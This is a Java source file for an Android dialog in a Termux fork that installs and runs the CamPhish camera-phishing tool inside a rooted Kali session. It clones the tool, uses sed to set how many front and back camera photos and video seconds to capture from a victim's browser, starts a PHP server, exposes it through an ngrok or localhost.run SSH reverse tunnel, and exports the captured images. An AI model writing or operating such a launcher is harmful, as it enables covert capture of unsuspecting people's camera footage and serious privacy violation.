package com.termux.zerocore.dialog;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.termux.R;
import com.termux.app.TermuxActivity;

import com.termux.app.TermuxService;
import com.termux.app.terminal.TermuxTerminalSessionActivityClient;
import com.termux.terminal.TerminalSession;
import com.termux.zerocore.utermux_windows.qemu.dialog.FileListDialog;

import java.io.File;
import java.util.List;

public class CamphishDialog extends BaseDialogCentre {

    private EditText editTextNgrokToken;
    private EditText editTextFrontPhotoCount;
    private EditText editTextBackPhotoCount;
    private EditText editTextFrontVideoSeconds;
    private EditText editTextBackVideoSeconds;
    private Button buttonStart;
    private Button buttonStop;
    private Button buttonUpdate;
    private Button buttonViewFiles;
    private TextView stopHintText;
    private Button buttonTunnelStart;
    private Button buttonTunnelStop;

    public CamphishDialog(@NonNull Context context) {
        super(context);
    }

    @Override
    void initViewDialog(View mView) {
        editTextNgrokToken = mView.findViewById(R.id.editTextNgrokToken);
        editTextFrontPhotoCount = mView.findViewById(R.id.editTextFrontPhotoCount);
        editTextBackPhotoCount = mView.findViewById(R.id.editTextBackPhotoCount);
        editTextFrontVideoSeconds = mView.findViewById(R.id.editTextFrontVideoSeconds);
        editTextBackVideoSeconds = mView.findViewById(R.id.editTextBackVideoSeconds);
        buttonStart = mView.findViewById(R.id.buttonStart);
        buttonStop = mView.findViewById(R.id.buttonStop);
        buttonUpdate = mView.findViewById(R.id.buttonUpdate);
        buttonViewFiles = mView.findViewById(R.id.buttonViewFiles);
        stopHintText = mView.findViewById(R.id.stopHintText);
        buttonTunnelStart = mView.findViewById(R.id.buttonTunnelStart);
        buttonTunnelStop = mView.findViewById(R.id.buttonTunnelStop);

        buttonStart.setOnClickListener(v -> startCamPhish());
        buttonUpdate.setOnClickListener(v -> updateCamPhish());
        buttonViewFiles.setOnClickListener(v -> viewCapturedFiles());

        buttonStop.setOnClickListener(v -> {
            // Stop main.py, php, ngrok
            // 优先使用 SIGINT (模拟 Ctrl+C)
            String stopCmd = "pkill -SIGINT -f 'python3 main.py' || kill -2 $(pgrep -f 'python3 main.py') || pkill -f 'python3 main.py' || pkill -9 -f 'python3 main.py'; " +
                             "pkill -f 'php -S 0.0.0.0:8080'; " +
                             "pkill -f 'ngrok http'";
            executeInRootKali(stopCmd, "Kali-CamPhish");
        });
        
        buttonTunnelStart.setOnClickListener(v -> {
             // Use same tunnel command as Seeker: ssh -R 80:localhost:8080 nokey@localhost.run
             // CamPhish uses 8080 by default
             String cmd = "ssh -R 80:localhost:8080 nokey@localhost.run";
             executeInRootKali(cmd, "Kali-Tunnel");
        });

        buttonTunnelStop.setOnClickListener(v -> {
             // 优先使用 SIGINT (模拟 Ctrl+C)
             String stopCmd = "pkill -SIGINT -f 'ssh -R 80:localhost' || kill -2 $(pgrep -f 'ssh -R 80:localhost') || pkill -f 'ssh -R 80:localhost'";
             executeInRootKali(stopCmd, "Kali-Tunnel");
        });
        
        // 初始化时启用停止按钮，以防用户之前已经启动了进程但重启了 APP
        // 这里简单处理，总是允许点击停止。更完善的做法是检查进程是否存在。
        buttonStop.setEnabled(true);
        buttonStop.setAlpha(1.0f);
        if (stopHintText != null) stopHintText.setVisibility(View.GONE);
    }

    private void executeInRootKali(String command, String sessionName) {
        if (mContext instanceof TermuxActivity) {
            TermuxActivity activity = (TermuxActivity) mContext;
            TermuxService mTermuxService = activity.mTermuxService;
            TermuxTerminalSessionActivityClient mTermuxTerminalSessionActivityClient = activity.mTermuxTerminalSessionActivityClient;
            
            TerminalSession targetSession = null;

            if (mTermuxService != null) {
                List<com.termux.shared.termux.shell.command.runner.terminal.TermuxSession> sessions = mTermuxService.getTermuxSessions();
                for (int i = 0; i < sessions.size(); i++) {
                    TerminalSession session = sessions.get(i).getTerminalSession();
                    if (sessionName.equals(session.mSessionName)) {
                        targetSession = session;
                        break;
                    }
                }
            }

            if (targetSession != null) {
                mTermuxTerminalSessionActivityClient.setCurrentSession(targetSession);
            } else {
                mTermuxTerminalSessionActivityClient.addNewSession(false, sessionName);
            }

            if (TermuxActivity.mTerminalView != null) {
                TermuxActivity.mTerminalView.sendTextToTerminal("nethunter -r\n");
                TermuxActivity.mTerminalView.sendTextToTerminal(command + "\n");
            }
        }
    }

    private void viewCapturedFiles() {
        String sdcardPath = Environment.getExternalStorageDirectory().getPath() + "/ZeroTermux/CamPhish";
        String copyCmd = "mkdir -p " + sdcardPath + " && cp -rf /usr/share/camphish/uploads/* " + sdcardPath + "/";
        
        executeInRootKali(copyCmd, "Kali-CamPhish");
        
        Toast.makeText(mContext, "正在导出文件到: " + sdcardPath, Toast.LENGTH_SHORT).show();
        
        FileListDialog dialog = new FileListDialog(mContext);
        dialog.setTitleText("CamPhish 捕获文件");
        File dir = new File(sdcardPath);
        if (!dir.exists()) dir.mkdirs();
        dialog.setFilePath(dir);
        
        dialog.setOnItemFileClickListener(file -> {
             try {
                 // Try to open file using system intent
                 android.os.StrictMode.VmPolicy.Builder builder = new android.os.StrictMode.VmPolicy.Builder();
                 android.os.StrictMode.setVmPolicy(builder.build());
                 
                 Intent intent = new Intent(Intent.ACTION_VIEW);
                 Uri uri = Uri.fromFile(file);
                 intent.setDataAndType(uri, "image/*"); 
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 mContext.startActivity(intent);
             } catch (Exception e) {
                 Toast.makeText(mContext, "无法打开文件: " + e.getMessage(), Toast.LENGTH_SHORT).show();
             }
        });
        
        dialog.show();
    }

    private void updateCamPhish() {
        String updateCmd = "echo 'Updating CamPhish...'; " +
                           "rm -rf /usr/share/camphish; " +
                           "mkdir -p /usr/share; " +
                           "cd /usr/share; " +
                           "git clone https://github.com/skilfulwriter/CamPhish.git camphish;";
        executeInRootKali(updateCmd, "Kali-CamPhish");
    }

    private void startCamPhish() {
        String token = editTextNgrokToken.getText().toString().trim();
        String frontCount = editTextFrontPhotoCount.getText().toString().trim();
        String backCount = editTextBackPhotoCount.getText().toString().trim();
        String frontSec = editTextFrontVideoSeconds.getText().toString().trim();
        String backSec = editTextBackVideoSeconds.getText().toString().trim();
        
        if (frontCount.isEmpty()) frontCount = "2";
        if (backCount.isEmpty()) backCount = "2";
        if (frontSec.isEmpty()) frontSec = "3";
        if (backSec.isEmpty()) backSec = "3";

        StringBuilder command = new StringBuilder();
        // Check installation
        command.append("if [ ! -d /usr/share/camphish ]; then mkdir -p /usr/share; cd /usr/share; git clone https://github.com/skilfulwriter/CamPhish.git camphish; fi && ");
        
        command.append("cd /usr/share/camphish && ");
        
        // Write token if provided, else create empty token file to avoid prompt (if not patched)
        if (!token.isEmpty()) {
            command.append("echo '").append(token).append("' > token.txt && ");
        } else {
             // Create empty token file if it doesn't exist, just in case
             command.append("touch token.txt && ");
        }
        
        // Update index.html using sed
        // Pattern from main.py: let frontPhotoCount = \d+;
        command.append("sed -i 's/let frontPhotoCount = [0-9]\\+;/let frontPhotoCount = ").append(frontCount).append(";/' index.html && ");
        command.append("sed -i 's/let backPhotoCount = [0-9]\\+;/let backPhotoCount = ").append(backCount).append(";/' index.html && ");
        command.append("sed -i 's/let frontVideoSeconds = [0-9]\\+;/let frontVideoSeconds = ").append(frontSec).append(";/' index.html && ");
        command.append("sed -i 's/let backVideoSeconds = [0-9]\\+;/let backVideoSeconds = ").append(backSec).append(";/' index.html && ");
        
        // Patch main.py to disable interactive inputs
        // 1. Disable Ngrok Token input: user_token = input(...) -> user_token = ''
        command.append("sed -i \"s/user_token = input.*/user_token = ''/\" main.py && ");
        // 2. Disable index.html settings input: forindex = input(...) -> forindex = 'N'
        command.append("sed -i \"s/forindex = input.*/forindex = 'N'/\" main.py && ");
        
        // Run main.py
        command.append("python3 main.py");
        
        executeInRootKali(command.toString(), "Kali-CamPhish");
    }

    @Override
    int getContentView() {
        return R.layout.dialog_camphish;
    }
}